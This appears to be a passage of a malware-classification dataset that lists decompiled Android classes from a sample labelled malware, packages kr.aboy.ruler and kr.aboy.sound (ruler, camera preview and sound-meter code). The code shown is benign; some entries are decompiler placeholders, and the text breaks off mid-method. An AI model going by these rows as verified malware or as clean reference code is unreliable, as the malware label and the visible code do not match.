"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\c.code","class c implements SensorEventListener {   float f442a;   float f443b;   float c;   h[] j;   final SmartRuler m;   float[] d=new float[9];   float[] e=new float[9];   float[] f=new float[9];   float[] g=new float[3];   float[] h=new float[3];   boolean i=false;   float[] k=new float[3];   int l=0;   public c(  SmartRuler smartRuler){     this.m=smartRuler;     this.j=new h[]{new h(smartRuler,null),new h(smartRuler,null),new h(smartRuler,null)};   }   @Override public void onAccuracyChanged(  Sensor sensor,  int i){   }   @Override public void onSensorChanged(  SensorEvent sensorEvent){     int i;     CustomView customView;     CustomView customView2;     float a2;     float a3;     float a4;     float b2;     CustomView customView3;     CustomView customView4;     SensorManager sensorManager;     SensorManager sensorManager2;     SensorEventListener sensorEventListener;     i=this.m.O;     if (i == 4) {       this.f443b=sensorEvent.values[1] - SmartRuler.B;       this.c=sensorEvent.values[2] - SmartRuler.A;       customView=this.m.K;       customView.a(SmartRuler.a(this.f443b),SmartRuler.a(this.c));       customView2=this.m.K;       customView2.postInvalidate();       return;     }     if (sensorEvent.sensor.getType() == 1) {       this.g=(float[])sensorEvent.values.clone();       int i2=this.l + 1;       this.l=i2;       if (i2 == 300) {         this.m.a(this.m.getString(C0000R.string.sensor_error));         sensorManager=this.m.L;         if (sensorManager != null) {           sensorManager2=this.m.L;           sensorEventListener=this.m.Q;           sensorManager2.unregisterListener(sensorEventListener);         }       }     }  else     if (sensorEvent.sensor.getType() == 2) {       this.h=(float[])sensorEvent.values.clone();       this.i=true;       this.l=0;     }     if (this.h == null || this.g == null || !this.i) {       return;     }     SensorManager.getRotationMatrix(this.d,this.f,this.g,this.h);     SensorManager.remapCoordinateSystem(this.d,1,3,this.e);     SensorManager.getOrientation(this.e,this.k);     a2=this.j[0].a(this.k[0]);     this.f442a=(float)Math.toDegrees(a2);     a3=this.j[1].a(this.k[1]);     this.f443b=90.0f - ((float)Math.toDegrees(a3));     a4=this.j[2].a(this.k[2]);     this.c=(((float)Math.toDegrees(a4)) + 90.0f) - SmartRuler.v;     b2=this.m.b(this.f443b);     this.f443b=b2;     customView3=this.m.K;     customView3.a(SmartRuler.a(this.f442a),SmartRuler.a(this.f443b),SmartRuler.a(this.c));     customView4=this.m.K;     customView4.postInvalidate();     this.i=false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\CustomView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7e803b42"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\d.code","public class d implements SlidingDrawer.OnDrawerScrollListener {   final SmartRuler f444a;   public d(  SmartRuler smartRuler){     this.f444a=smartRuler;   }   @Override public void onScrollEnded(){   }   @Override public void onScrollStarted(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\DialogWidth.code","public class DialogWidth extends Activity {   private final float f433a=50.0f;   private final float f434b=250.0f;   private final float c=2.0f;   private final float d=10.0f;   private SharedPreferences e;   public void a(  String str){     Toast.makeText(this,str,0).show();   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     setContentView(C0000R.layout.dialog_width);     String stringExtra=getIntent().getStringExtra(""SmartRuler"");     ((EditText)findViewById(C0000R.id.width)).setText(stringExtra);     this.e=PreferenceManager.getDefaultSharedPreferences(this);     if (SmartRuler.E == 1) {       ((TextView)findViewById(C0000R.id.unit)).setText(C0000R.string.dialog_unit_inch);     }  else {       ((TextView)findViewById(C0000R.id.unit)).setText(C0000R.string.dialog_unit_mm);     }     ((Button)findViewById(C0000R.id.button)).setOnClickListener(new a(this,stringExtra));     ((Button)findViewById(C0000R.id.button1)).setOnClickListener(new b(this));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\e.code","public class e implements SlidingDrawer.OnDrawerOpenListener {   final SmartRuler f445a;   public e(  SmartRuler smartRuler){     this.f445a=smartRuler;   }   @Override public void onDrawerOpened(){     this.f445a.N=true;     ((ImageView)this.f445a.findViewById(C0000R.id.icon_slide)).setImageResource(C0000R.drawable.slide_close);     ((RelativeLayout)this.f445a.findViewById(C0000R.id.handle)).setBackgroundResource(C0000R.drawable.slide_handle_bar);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\f.code","public class f implements SlidingDrawer.OnDrawerCloseListener {   final SmartRuler f446a;   public f(  SmartRuler smartRuler){     this.f446a=smartRuler;   }   @Override public void onDrawerClosed(){     this.f446a.N=false;     ((ImageView)this.f446a.findViewById(C0000R.id.icon_slide)).setImageResource(C0000R.drawable.slide_open);     ((RelativeLayout)this.f446a.findViewById(C0000R.id.handle)).setBackgroundResource(C0000R.drawable.slide_handle_rect);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\g.code","class g implements Runnable {   final SmartRuler f447a;   public g(  SmartRuler smartRuler){     this.f447a=smartRuler;   }   @Override public void run(){     this.f447a.startActivity(new Intent(this.f447a.getApplicationContext(),(Class<?>)SmartMeasure.class));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\h.code","class h {   final int f448a;   float[] f449b;   int c;   final SmartRuler d;   private h(  SmartRuler smartRuler){     this.d=smartRuler;     this.f448a=5;     this.f449b=new float[5];     this.c=0;   }   public h(  SmartRuler smartRuler,  h hVar){     this(smartRuler);   }   public float a(  float f){     if (this.f449b[this.c] * f < -1.0f) {       for (int i=0; i < this.f449b.length; i++) {         float[] fArr=this.f449b;         fArr[i]=fArr[i] * (-1.0f);       }     }     this.c++;     if (this.c > this.f449b.length - 1) {       this.c=0;     }     this.f449b[this.c]=f;     float f2=360.0f;     float f3=-360.0f;     float f4=0.0f;     for (    float f5 : this.f449b) {       f3=Math.max(f3,f5);       f2=Math.min(f2,f5);       f4+=f5;     }     return ((f4 - f3) - f2) / (this.f449b.length - 2);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\PrefActivity.code","public class PrefActivity extends PreferenceActivity {   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     addPreferencesFromResource(C0000R.xml.settings_ruler);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\Preview.code","public final class Preview extends SurfaceView implements SurfaceHolder.Callback {   private SurfaceHolder f435a;   private Camera f436b;   private Context c;   private PowerManager.WakeLock d;   private PowerManager e;   private int f;   private int g;   public Preview(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.c=context;     this.f435a=getHolder();     this.f435a.addCallback(this);     this.f435a.setType(3);   }   private Camera.Size a(  int i,  int i2,  Camera.Parameters parameters){     double d=i / i2;     try {       Iterator<Camera.Size> it=parameters.getSupportedPreviewSizes().iterator();       while (it.hasNext()) {         Camera.Size next=it.next();         if (Math.abs((next.width / next.height) - d) < 0.1d && (next.width != i || next.height != i2)) {           if (next.width < (i * 3) / 2 && next.height < (i2 * 3) / 2 && (next.width > i / 2 || next.height > i2 / 2)) {             return next;           }         }       }     }  catch (    NullPointerException e) {       e.printStackTrace();     }     return null;   }   private Camera.Size b(  int i,  int i2,  Camera.Parameters parameters){     try {       Camera.Size size=null;       for (      Camera.Size size2 : parameters.getSupportedPreviewSizes()) {         if (size2.width <= i && size2.height <= i2) {           if (size == null) {             size=size2;           }  else {             if (((i - size2.width) + i2) - size2.height < ((i - size.width) + i2) - size.height) {               size=size2;             }           }         }       }       if (size == null) {         return null;       }       if (size.width > i / 2.2f || size.height > i2 / 2.2f) {         return size;       }       return null;     }  catch (    NullPointerException e) {       e.printStackTrace();       return null;     }   }   @Override public void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){     try {       if (this.f436b != null) {         Camera.Parameters parameters=this.f436b.getParameters();         Camera.Size a2=a(i2,i3,parameters);         if (a2 == null) {           a2=b(i2,i3,parameters);         }         if (a2 == null || Build.MODEL.equals(""T-01C"") || Build.MODEL.equals(""IS04"")) {           this.f=i2;           this.g=i3;         }  else {           this.f=a2.width;           this.g=a2.height;         }         try {           parameters.setPreviewSize(this.f,this.g);           this.f436b.setParameters(parameters);           this.f436b.startPreview();         }  catch (        RuntimeException e) {           this.f=this.f436b.getParameters().getPreviewSize().width;           this.g=this.f436b.getParameters().getPreviewSize().height;           try {             parameters.setPreviewSize(this.f,this.g);             this.f436b.setParameters(parameters);             this.f436b.startPreview();           }  catch (          RuntimeException e2) {             this.f=160;             this.g=120;             try {               parameters.setPreviewSize(this.f,this.g);               this.f436b.setParameters(parameters);               this.f436b.startPreview();             }  catch (            RuntimeException e3) {               e3.printStackTrace();             }           }         }       }     }  catch (    NullPointerException e4) {       e4.printStackTrace();     }   }   @Override public void surfaceCreated(  SurfaceHolder surfaceHolder){     if (this.f436b == null) {       try {         this.f436b=Camera.open();         this.f436b.setPreviewDisplay(this.f435a);       }  catch (      IOException e) {         this.f436b.release();         this.f436b=null;         e.printStackTrace();       } catch (      Exception e2) {         e2.printStackTrace();       }     }     this.e=(PowerManager)this.c.getSystemService(""power"");     if (this.d == null || !this.d.isHeld()) {       this.d=this.e.newWakeLock(10,""Smart Tools"");       this.d.acquire();     }   }   @Override public void surfaceDestroyed(  SurfaceHolder surfaceHolder){     if (this.f436b != null) {       this.f436b.stopPreview();       this.f436b.release();       this.f436b=null;     }     if (this.d.isHeld()) {       this.d.release();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.ruler\SmartRuler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@449577ff"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\a.code","class a implements Runnable {   final CustomView f458a;   public a(  CustomView customView){     this.f458a=customView;   }   @Override public void run(){     c cVar;     float f;     b bVar;     float f2;     float f3;     if (SmartSound.o == 0) {       bVar=this.f458a.F;       bVar.b();       CustomView customView=this.f458a;       CustomView customView2=this.f458a;       CustomView customView3=this.f458a;       f2=this.f458a.h;       customView3.k=f2;       customView2.j=f2;       customView.i=f2;       CustomView customView4=this.f458a;       CustomView customView5=this.f458a;       CustomView customView6=this.f458a;       f3=this.f458a.h;       String num=Integer.toString(Math.round(f3));       customView6.o=num;       customView5.n=num;       customView4.m=num;     }  else {       cVar=this.f458a.G;       cVar.a();       CustomView customView7=this.f458a;       CustomView customView8=this.f458a;       f=this.f458a.h;       float f4=f / 10.0f;       customView8.k=f4;       customView7.i=f4;       CustomView customView9=this.f458a;       this.f458a.o=""0.0"";       customView9.m=""0.0"";     }     this.f458a.p=1;     SmartSound.j.a();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\b.code","public class b {   final int f459a;   final int f460b;   int[] c;   int d;   int[] e;   int f;   int g;   int h;   boolean i;   boolean j;   float k;   float l;   float m;   float n;   float o;   float p;   Path q;   final CustomView r;   private b(  CustomView customView){     this.r=customView;     this.f459a=SmartSound.r;     this.f460b=100;     this.c=new int[this.f459a <= 3000 ? this.f459a : 3000];     this.d=this.f459a / 3000;     this.e=new int[this.d > 0 ? this.d : 1];     this.f=0;     this.g=0;     this.h=0;     this.i=true;     this.j=false;   }   public b(  CustomView customView,  b bVar){     this(customView);   }   private int a(){     int[] iArr=new int[3];     for (int i=0; i < this.d; i++) {       if (this.e[i] > iArr[0]) {         int i2=iArr[0];         iArr[0]=this.e[i];         this.e[i]=i2;       }       if (this.e[i] > iArr[1]) {         int i3=iArr[1];         iArr[1]=this.e[i];         this.e[i]=i3;       }       if (this.e[i] > iArr[2]) {         int i4=iArr[2];         iArr[2]=this.e[i];         this.e[i]=i4;       }     }     return Math.round(((iArr[0] + iArr[1]) + iArr[2]) / 3.0f);   }   public static Path a(  b bVar){     return bVar.c();   }   public void a(  int i){     if (this.f459a <= 3000) {       this.g++;       if (this.g > this.c.length - 1) {         this.g=0;         this.j=true;       }       this.c[this.g]=Math.min(i,100);       return;     }     if (this.f != this.d - 1) {       this.e[this.f]=Math.min(i,100);       this.f++;       return;     }     this.e[this.f]=Math.min(i,100);     this.g++;     if (this.g > this.c.length - 1) {       this.g=0;       this.j=true;     }     this.c[this.g]=a();     this.f=0;   }   public static void a(  b bVar,  int i){     bVar.a(i);   }   public void b(){     this.h=0;     this.g=0;     this.r.q=System.currentTimeMillis();     this.j=false;   }   public Path c(){     Bitmap bitmap;     Bitmap bitmap2;     float f;     int i;     float f2;     float f3;     float f4;     int i2;     int i3=0;     if (this.i) {       bitmap=this.r.w;       this.k=bitmap.getWidth() * 0.9f;       bitmap2=this.r.w;       this.l=bitmap2.getHeight();       f=this.r.N;       this.m=f - (this.k / 2.0f);       i=this.r.K;       f2=this.r.R;       f3=this.r.H;       this.n=i - ((f2 * f3) * 5.0f);       this.o=this.k / this.c.length;       this.p=this.l / 100.0f;       if (this.f459a == 150) {         f4=this.r.N;         float f5=f4 - (this.k / 2.0f);         i2=this.r.J;         this.m=f5 + (i2 / 200);       }       this.i=false;     }     if (this.f == 0) {       this.q=new Path();       this.q.moveTo(this.m,this.n);       while (true) {         if (i3 >= (this.j ? this.c.length : this.g)) {           break;         }         if (i3 == 0 && this.j) {           this.h=this.g + 1;         }         int i4=this.h + i3;         if (i4 > this.c.length - 1) {           i4-=this.c.length;         }         if (i3 == 0) {           this.q.moveTo(this.m - this.o,this.n - (this.p * this.c[i4]));         }         this.q.lineTo(this.m + (this.o * i3),this.n - (this.c[i4] * this.p));         i3++;       }     }     return this.q;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\c.code","public class c {   final int f461a;   float[] f462b;   int c;   int d;   boolean e;   boolean f;   float g;   float h;   float i;   float j;   float k;   float l;   Path m;   final CustomView n;   private c(  CustomView customView){     this.n=customView;     this.f461a=50;     this.f462b=new float[50];     this.c=0;     this.d=0;     this.e=true;     this.f=false;   }   public c(  CustomView customView,  c cVar){     this(customView);   }   public void a(){     this.d=0;     this.c=0;     this.f=false;   }   public void a(  float f){     this.c++;     if (this.c > this.f462b.length - 1) {       this.c=0;       this.f=true;     }     this.f462b[this.c]=f;   }   public Path b(){     int i=0;     if (this.e) {       this.g=CustomView.g(this.n).getWidth() * 0.75f;       this.h=(CustomView.g(this.n).getHeight() / 2) * 0.75f;       this.i=CustomView.b(this.n) - (this.g / 2.0f);       this.j=CustomView.h(this.n);       this.k=this.g / 100.0f;       this.l=this.h / 120.0f;       this.e=false;     }     this.m=new Path();     if (this.f) {       this.m.moveTo(this.i,this.j);       while (true) {         int i2=i;         if (i2 >= 50) {           break;         }         if (i2 == 0) {           this.d=this.c + 1;         }         int i3=this.d + i2;         if (i3 > this.f462b.length - 1) {           i3-=50;         }         this.m.lineTo(this.i + (this.k * ((i2 * 2) + 1)),this.j + (this.l * this.f462b[i3]));         this.m.lineTo(this.i + (this.k * ((i2 * 2) + 2)),this.j - (this.f462b[i3] * this.l));         i=i2 + 1;       }     }  else {       this.m.moveTo(this.i + (this.k * (50 - this.c) * 2.0f),this.j);       while (i < this.c) {         int i4=this.d + i;         if (i4 > this.f462b.length - 1) {           i4-=50;         }         this.m.lineTo(this.i + (this.k * (50 - this.c) * 2.0f) + (this.k * ((i * 2) + 1)),this.j + (this.l * this.f462b[i4]));         this.m.lineTo(this.i + (this.k * (50 - this.c) * 2.0f) + (this.k * ((i * 2) + 2)),this.j - (this.f462b[i4] * this.l));         i++;       }     }     return this.m;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.sound\CustomView.code","public class CustomView extends View implements View.OnLongClickListener, View.OnTouchListener {   private Bitmap A;   private Bitmap B;   private Bitmap C;   private String[] D;   private String[] E;   private b F;   private c G;   private float H;   private final float I;   private int J;   private int K;   private int L;   private boolean M;   private float N;   private float O;   private float P;   private float Q;   private float R;   private int S;   private final float T;   Boolean f450a;   private final int f451b;   private final int c;   private final int d;   private final int e;   private final Paint f;   private Context g;   private float h;   private float i;   private float j;   private float k;   private String l;   private String m;   private String n;   private String o;   private int p;   private long q;   private int[] r;   private String s;   private Bitmap t;   private Bitmap u;   private Bitmap v;   private Bitmap w;   private Bitmap x;   private Bitmap y;   private Bitmap z;   public CustomView(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.h=0.0f;     this.i=0.0f;     this.j=200.0f;     this.k=0.0f;     this.l="""";     this.m=""0.0"";     this.n=""0.0"";     this.o=""0.0"";     this.p=0;     this.q=System.currentTimeMillis();     this.r=new int[3];     this.f450a=true;     this.F=new b(this,null);     this.G=new c(this,null);     this.H=1.0f;     this.I=1.7f;     this.M=true;     this.P=0.0f;     this.T=getContext().getResources().getDisplayMetrics().densityDpi / 25.4f;     this.f=new Paint(1);     this.g=context;     Resources resources=getResources();     this.f451b=resources.getColor(C0000R.color.white_color);     this.c=resources.getColor(C0000R.color.black_color);     this.d=resources.getColor(C0000R.color.text_color1);     this.e=resources.getColor(C0000R.color.text_color2);     if (SmartSound.o == 0) {       this.t=BitmapFactory.decodeResource(getResources(),C0000R.drawable.meter_sound);       this.u=BitmapFactory.decodeResource(getResources(),C0000R.drawable.needle_sound);       this.v=BitmapFactory.decodeResource(getResources(),C0000R.drawable.wheel);       this.w=BitmapFactory.decodeResource(getResources(),C0000R.drawable.chart_sound);       this.x=BitmapFactory.decodeResource(getResources(),C0000R.drawable.button_text);       this.y=BitmapFactory.decodeResource(getResources(),C0000R.drawable.button_chart);       this.z=BitmapFactory.decodeResource(getResources(),C0000R.drawable.button_play);       this.A=BitmapFactory.decodeResource(getResources(),C0000R.drawable.button_pause);       this.D=new String[13];       this.D[0]=(String)this.g.getText(C0000R.string.db20_msg);       this.D[1]=(String)this.g.getText(C0000R.string.db30_msg);       this.D[2]=(String)this.g.getText(C0000R.string.db40_msg);       this.D[3]=(String)this.g.getText(C0000R.string.db50_msg);       this.D[4]=(String)this.g.getText(C0000R.string.db60_msg);       this.D[5]=(String)this.g.getText(C0000R.string.db70_msg);       this.D[6]=(String)this.g.getText(C0000R.string.db80_msg);       this.D[7]=(String)this.g.getText(C0000R.string.db90_msg);       this.D[8]=(String)this.g.getText(C0000R.string.db100_msg);       this.D[9]=(String)this.g.getText(C0000R.string.db110_msg);       this.D[10]=(String)this.g.getText(C0000R.string.db120_msg);       this.D[11]=(String)this.g.getText(C0000R.string.db130_msg);       this.D[12]=(String)this.g.getText(C0000R.string.db180_msg);     }  else {       this.t=BitmapFactory.decodeResource(getResources(),C0000R.drawable.meter_vib);       this.u=BitmapFactory.decodeResource(getResources(),C0000R.drawable.needle_vib);       this.B=BitmapFactory.decodeResource(getResources(),C0000R.drawable.sound_on);       this.C=BitmapFactory.decodeResource(getResources(),C0000R.drawable.sound_off);       this.E=new String[13];       this.E[0]=(String)this.g.getText(C0000R.string.vib1_msg);       this.E[1]=(String)this.g.getText(C0000R.string.vib2_msg);       this.E[2]=(String)this.g.getText(C0000R.string.vib3_msg);       this.E[3]=(String)this.g.getText(C0000R.string.vib4_msg);       this.E[4]=(String)this.g.getText(C0000R.string.vib5_msg);       this.E[5]=(String)this.g.getText(C0000R.string.vib6_msg);       this.E[6]=(String)this.g.getText(C0000R.string.vib7_msg);       this.E[7]=(String)this.g.getText(C0000R.string.vib8_msg);       this.E[8]=(String)this.g.getText(C0000R.string.vib9_msg);       this.E[9]=(String)this.g.getText(C0000R.string.vib10_msg);       this.E[10]=(String)this.g.getText(C0000R.string.vib11_msg);       this.E[11]=(String)this.g.getText(C0000R.string.vib12_msg);       this.E[12]=(String)this.g.getText(C0000R.string.vib13_msg);     }     setOnTouchListener(this);     setOnLongClickListener(this);     setFocusable(true);   }   private void a(){     int i=SmartSound.r;     long currentTimeMillis=System.currentTimeMillis();     if (i == 150) {       int i2=(currentTimeMillis - this.q) / 200 > ((long)i) ? (int)(((currentTimeMillis - this.q) / 1000) - (i / 5)) : 0;       this.s="" Sec"";       this.r[0]=i2;       this.r[1]=i2 + 15;       this.r[2]=i2 + 30;       return;     }     int i3=(currentTimeMillis - this.q) / 200 > ((long)i) ? (int)(((currentTimeMillis - this.q) / 60000) - (i / 300)) : 0;     this.s="" Min"";     this.r[0]=i3;     this.r[1]=(i / 600) + i3;     this.r[2]=i3 + (i / 300);   }   private void a(  Canvas canvas){     int i=this.S <= 7 ? 1 : 0;     if (this.h < (i * 10) + 20) {       this.h=(i * 10) + 20;     }  else     if (this.h >= ((this.S + i) * 10) + 20) {       this.h=(((this.S + i) * 10) + 20) - 1;     }     this.f.setColor(this.d);     this.f.setTextSize(this.R * this.H);     for (int i2=0; i2 < this.S; i2++) {       if (((int)((this.h - 20.0f) / 10.0f)) == i2 + i) {         this.f.setColor(this.e);         canvas.drawText(""â–¶"",2.0f * this.T * this.H* this.H,this.K - (((((i2 * this.R) * this.H) * (this.S + 1)) / this.S) + ((this.T * 11.0f) * this.H)),this.f);       }       canvas.drawText(this.D[i + i2],3.5f * this.T * this.H* this.H,this.K - (((((i2 * this.R) * this.H) * (this.S + 1)) / this.S) + ((this.T * 11.0f) * this.H)),this.f);       if (((int)((this.h - 20.0f) / 10.0f)) == i2 + i) {         this.f.setColor(this.d);       }     }   }   private void b(  Canvas canvas){     if (this.h < 10.0f) {       this.h=10.0f;     }  else     if (this.h >= (this.S * 10) + 10) {       this.h=((this.S * 10) + 10) - 1;     }     this.f.setColor(this.d);     this.f.setTextSize(this.R * this.H);     int i=0;     while (i < this.S) {       if (((int)((this.h - 10.0f) / 10.0f)) == i) {         this.f.setColor(this.e);         canvas.drawText(""â–¶"",1.5f * this.T * this.H* this.H,this.K - (((((i * this.R) * this.H) * (this.S + 1)) / this.S) + ((this.T * 11.0f) * this.H)),this.f);       }       canvas.drawText(this.E[i],this.H * 3.5f * this.T* this.H,this.K - ((((((i == 12 ? 13 : i) * this.R) * this.H) * (this.S + 1)) / this.S) + ((this.T * 11.0f) * this.H)),this.f);       if (((int)((this.h - 10.0f) / 10.0f)) == i) {         this.f.setColor(this.d);       }       i++;     }   }   public void a(  float f){     this.h=f;     this.l=Integer.toString(Math.round(f));     if (f > this.i) {       this.i=f;       this.m=Integer.toString(Math.round(f));     }  else     if (f < this.j) {       this.j=f;       this.n=Integer.toString(Math.round(f));     }     this.k=(float)(Math.log10(((this.p * Math.pow(10.0d,this.k / 10.0f)) + Math.pow(10.0d,f / 10.0f)) / (this.p + 1)) * 10.0d);     this.o=Integer.toString(Math.round(this.k));     this.p++;     SmartSound.j.a(Math.round(f));     this.F.a(Math.round(this.h));   }   public void b(  float f){     this.h=f;     this.l=Float.toString(Math.round(f) / 10.0f);     if (f > this.i) {       this.i=f;       this.m=Float.toString(Math.round(f) / 10.0f);     }  else     if (f < this.j) {       this.j=f;       this.n=Float.toString(Math.round(f) / 10.0f);     }     if (f >= 3.0f) {       this.k=((this.k * this.p) + f) / (this.p + 1);       this.o=Float.toString(Math.round(this.k) / 10.0f);       this.p++;     }     if (f > 0.0f) {       SmartSound.j.a(Math.round(f));     }     this.G.a(this.h);   }   @Override public void onDraw(  Canvas canvas){     Path b2;     Path c;     if (this.M) {       this.J=Math.min(canvas.getWidth(),canvas.getHeight());       this.K=Math.max(canvas.getWidth(),canvas.getHeight());       this.L=getContext().getResources().getDisplayMetrics().densityDpi;       if (SmartSound.i && (SmartSound.h > 160.0f || (SmartSound.h <= 0.0f && this.K >= 1280 && this.L <= 160))) {         this.H=1.7f;       }       this.N=this.J / 2;       this.O=(this.t.getHeight() / 2) + (this.T * 3.0f * this.H);       this.Q=this.K - (((Build.VERSION.SDK_INT < 14 || SmartSound.h >= 150.0f) ? 11.0f * this.T : 17.5f * this.T) + ((this.t.getHeight() / 2) + this.O));       this.S=(int)(this.Q / (2.6f * this.T));       if (this.S > 13) {         this.S=13;       }  else       if (this.S < 6) {         this.S=6;       }       this.R=this.Q / (this.S + 1);       if (this.K > 1000 && (SmartSound.h > 150.0f || (SmartSound.h <= 0.0f && this.K >= 1280 && this.L <= 160))) {         this.R=this.T * 3.0f;         this.O+=this.T * 2.0f * this.H* this.H;         if (SmartSound.o == 1) {           this.O+=this.T * 2.0f * this.H;         }       }  else       if (this.R > 26.0f) {         this.R=2.6f * this.T;         this.O+=this.T * 2.0f;         if (SmartSound.o == 1 && Build.VERSION.SDK_INT <= 13) {           this.O+=this.T * 2.0f;         }       }       this.f.setTextSize(4.0f * this.T * this.H);       this.P=this.f.measureText("" dB"");       this.f.setStrokeWidth(1.5f);       this.M=false;     }     try {       if (SmartSound.o != 0) {         canvas.drawBitmap(this.t,this.N - (this.t.getWidth() / 2),this.O - (this.t.getHeight() / 2),(Paint)null);         canvas.drawBitmap(SmartSound.p > 0 ? this.B : this.C,this.N + (this.t.getWidth() / 3.3f),this.O + (this.t.getHeight() / 3.7f),(Paint)null);         canvas.drawBitmap(this.u,((this.N + (this.t.getWidth() * 0.4f)) - this.u.getWidth()) + 3.0f,((this.O - (this.u.getHeight() / 2)) - ((((this.h / 120.0f) * this.t.getHeight()) / 2.0f) * 0.75f)) - 1.0f,(Paint)null);         if (this.h > 0.0f) {           canvas.drawBitmap(this.u,((this.N + (this.t.getWidth() * 0.4f)) - this.u.getWidth()) + 3.0f,((this.O - (this.u.getHeight() / 2)) + ((((this.h / 120.0f) * this.t.getHeight()) / 2.0f) * 0.75f)) - 1.0f,(Paint)null);         }         this.f.setColor(this.e);         this.f.setStyle(Paint.Style.STROKE);         b2=this.G.b();         canvas.drawPath(b2,this.f);         this.f.setStyle(Paint.Style.FILL);         this.f.setColor(this.c);         this.f.setTextSize(6.5f * this.T * this.H);         canvas.drawText(this.l,this.N - (this.f.measureText(this.l) / 2.0f),this.O + (this.t.getHeight() / 3.4f),this.f);         this.f.setTextSize(2.8f * this.T * this.H);         this.f.setColor(this.d);         canvas.drawText(String.valueOf(this.g.getString(C0000R.string.max_msg)) + "" : "" + this.m,this.N,this.O - (this.t.getHeight() / 3.4f),this.f);         canvas.drawText(String.valueOf(this.g.getString(C0000R.string.mean_msg)) + "" : "" + this.o,this.N - (this.t.getWidth() / 2.9f),this.O - (this.t.getHeight() / 3.4f),this.f);         if (SmartSound.k) {           return;         }         b(canvas);         return;       }       if (SmartSound.m) {         if (this.h >= 79.5d) {           setBackgroundColor(SupportMenu.CATEGORY_MASK);         }  else         if (this.h >= 69.5d) {           setBackgroundColor(-1426096171);         }  else         if (this.h >= 59.5d) {           setBackgroundColor(-7829368);         }  else {           setBackgroundColor(-1710619);         }       }       if (SmartSound.l) {         canvas.save();         canvas.rotate(180.0f,this.J / 2,(this.K - (8.0f * this.T)) / 2.0f);       }       canvas.drawBitmap(this.t,this.N - (this.t.getWidth() / 2),this.O - (this.t.getHeight() / 2),(Paint)null);       canvas.save();       canvas.rotate((this.h * 180.0f) / 100.0f,this.N,this.O);       canvas.drawBitmap(this.u,this.N - (this.u.getWidth() / 2),this.O - (this.u.getHeight() / 2),(Paint)null);       canvas.restore();       if (this.i > this.j + 10.0f) {         this.f.setTextSize(3.2f * this.T * this.H);         canvas.save();         canvas.rotate(((this.i - 70.0f) * 180.0f) / 100.0f,this.N,this.O);         this.f.setColor(this.c);         canvas.drawText(this.m,this.N - (this.f.measureText(this.m) / 2.0f),this.O - (this.t.getHeight() / 2.1f),this.f);         this.f.setColor(SupportMenu.CATEGORY_MASK);         canvas.drawLine(this.N,this.O - (this.v.getHeight() / 2.7f),this.N,this.O - (this.t.getHeight() / 2.1f),this.f);         canvas.restore();         canvas.save();         canvas.rotate(((this.j - 70.0f) * 180.0f) / 100.0f,this.N,this.O);         this.f.setColor(this.c);         canvas.drawText(this.n,this.N - (this.f.measureText(this.n) / 2.0f),this.O - (this.t.getHeight() / 2.1f),this.f);         this.f.setColor(SupportMenu.CATEGORY_MASK);         canvas.drawLine(this.N,this.O - (this.v.getHeight() / 2.7f),this.N,this.O - (this.t.getHeight() / 2.1f),this.f);         canvas.restore();         canvas.save();         canvas.rotate(((this.k - 70.0f) * 180.0f) / 100.0f,this.N,this.O);         this.f.setColor(this.c);         canvas.drawText(this.o,this.N - (this.f.measureText(this.o) / 2.0f),this.O - (this.t.getHeight() / 2.1f),this.f);         this.f.setColor(SupportMenu.CATEGORY_MASK);         canvas.drawLine(this.N,this.O - (this.v.getHeight() / 2.7f),this.N,this.O - (this.t.getHeight() / 2.1f),this.f);         canvas.restore();       }       canvas.drawBitmap(this.v,this.N - (this.v.getWidth() / 2),this.O - (this.v.getHeight() / 2),(Paint)null);       this.f.setColor(this.f451b);       this.f.setTextSize(6.5f * this.T * this.H);       canvas.drawText(this.l,this.N - ((this.f.measureText(this.l) + this.P) / 2.0f),this.O + (this.t.getHeight() / 4.5f),this.f);       this.f.setTextSize(4.0f * this.T * this.H);       canvas.drawText(""  dB"",this.N,this.O + (this.t.getHeight() / 4.5f),this.f);       if (!SmartSound.k) {         if (SmartSound.n) {           